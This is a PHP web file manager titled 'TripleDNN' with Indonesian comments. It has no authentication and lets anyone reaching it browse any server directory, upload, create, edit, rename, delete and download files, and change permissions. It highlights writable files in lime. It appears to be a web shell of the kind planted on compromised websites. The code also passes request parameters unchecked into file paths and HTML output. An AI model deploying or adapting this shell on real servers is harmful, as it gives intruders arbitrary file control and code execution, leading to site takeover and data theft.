<?php
// Set directory root menjadi public_html
$root_dir = realpath(__DIR__);
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir;
}

function listDirectory($dir)
{
    $files = scandir($dir);
    $directories = [];
    $regular_files = [];

    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;
            } else {
                $regular_files[] = $file;
            }
        }
    }

    function getPermissions($path)
    {
        $perms = fileperms($path);
        $symbolic = ($perms & 0x4000) ? 'd' : '-';
        $symbolic .= ($perms & 0x0100) ? 'r' : '-';
        $symbolic .= ($perms & 0x0080) ? 'w' : '-';
        $symbolic .= ($perms & 0x0040) ? 'x' : '-';
        $symbolic .= ($perms & 0x0020) ? 'r' : '-';
        $symbolic .= ($perms & 0x0010) ? 'w' : '-';
        $symbolic .= ($perms & 0x0008) ? 'x' : '-';
        $symbolic .= ($perms & 0x0004) ? 'r' : '-';
        $symbolic .= ($perms & 0x0002) ? 'w' : '-';
        $symbolic .= ($perms & 0x0001) ? 'x' : '-';
        $octal = substr(sprintf('%o', $perms), -4);
        return $symbolic . ' (' . $octal . ')';
    }

    foreach ($directories as $directory) {
        $fullPath = $dir . '/' . $directory;
        $perm = getPermissions($fullPath);
        $color = is_writable($fullPath) ? 'lime' : 'red';

        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($fullPath) . '" style="color:' . $color . ';">📁 ' . $directory . '</a></td>';
        echo '<td style="color:' . $color . ';">Folder</td>';
        echo '<td style="color:' . $color . ';">' . $perm . '</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&chmod=' . urlencode($directory) . '">Chmod</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a>
        </td>';
        echo '</tr>';
    }

    foreach ($regular_files as $file) {
        $fullPath = $dir . '/' . $file;
        $perm = getPermissions($fullPath);
        $color = is_writable($fullPath) ? 'lime' : 'red';
        $size = filesize($fullPath);

        echo '<tr>';
        echo '<td style="color:' . $color . ';">' . $file . '</td>';
        echo '<td style="color:' . $color . ';">' . $size . ' bytes</td>';
        echo '<td style="color:' . $color . ';">' . $perm . '</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&chmod=' . urlencode($file) . '">Chmod</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a>
        </td>';
        echo '</tr>';
    }
}
// Fungsi untuk menghapus file
if (isset($_GET['delete'])) {
    $file_to_delete = $current_dir . '/' . $_GET['delete'];
    if (is_file($file_to_delete)) {
        unlink($file_to_delete);
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk download file
if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

// Fungsi untuk rename file
if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    rename($old_name, $new_name);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk upload file
if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk mengedit file
if (isset($_POST['save_file'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    file_put_contents($file_to_edit, $new_content);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk membuat file baru
if (isset($_POST['create_file'])) {
    $new_file_name = $_POST['new_file_name'];
    $new_file_path = $current_dir . '/' . $new_file_name;
    // Buat file baru dengan konten kosong
    file_put_contents($new_file_path, "");
    header("Location: ?dir=" . urlencode($_GET['dir']));
}
//chmod dek
if (isset($_POST['chmod_submit'])) {
    $target = $_POST['chmod_target'];
    $new_perm = intval($_POST['new_perm'], 8); // ubah ke oktal
    if (file_exists($target)) {
        chmod($target, $new_perm);
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

?>

<!DOCTYPE html>
<html>
<?php if (isset($_GET['chmod'])):
    $chmod_target = $current_dir . '/' . $_GET['chmod'];
    $current_perm = substr(sprintf('%o', fileperms($chmod_target)), -4);
?>
<form method="post">
    <input type="hidden" name="chmod_target" value="<?php echo htmlspecialchars($chmod_target); ?>">
    <label style="color:#E0E0E0;">Change permission (current: <?php echo $current_perm; ?>): </label>
    <input type="text" name="new_perm" placeholder="e.g. 0755" required pattern="[0-7]{3,4}" style="width:80px;">
    <button type="submit" name="chmod_submit">Set</button>
</form>
<?php endif; ?>
<head>
    <title>TripleDNN</title>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu&display=swap" rel="stylesheet">
    <style>
        /* Styling dengan tema gelap (latar belakang hitam dan teks terang) */
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: 'Ubuntu', sans-serif;
        }
        h2 {
            color: #BB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: #222;
        }
        tr:nth-child(odd) {
            background-color: #121212;
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #121212;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #222;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #222;
            border: 1px solid #BB86FC;
            padding: 10px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .form-container form {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <p>Current Directory: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #03DAC6;"><?php echo $current_dir; ?></a></p>
    
    <div class="form-container">
        <!-- Form untuk upload file -->
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <!-- Form untuk membuat file baru -->
        <form method="post">
            <input type="text" name="new_file_name" placeholder="New file name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>

    <table border="1">
    <thead>
    <tr>
        <th>File Name</th>
        <th>Size</th>
        <th>Permissions</th>
        <th>Actions</th>
    </tr>
</thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <!-- Form untuk rename file -->
    <?php if (isset($_GET['rename'])): ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?php echo $_GET['rename']; ?>">
        <input type="text" name="new_name" placeholder="New name" style="width: 100%; padding: 10px;">
        <button type="submit" name="rename_file">Rename</button>
    </form>
    <?php endif; ?>

    <!-- Form untuk mengedit file -->
    <?php
    if (isset($_GET['edit'])):
        $file_to_edit = $current_dir . '/' . $_GET['edit'];
        if (is_file($file_to_edit)) {
            $file_content = file_get_contents($file_to_edit);
            ?>
            <form method="post">
                <input type="hidden" name="file_name" value="<?php echo $_GET['edit']; ?>">
                <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
                <br>
                <button type="submit" name="save_file">Save Changes</button>
            </form>
        <?php }
    endif; ?>
</body>
</html>
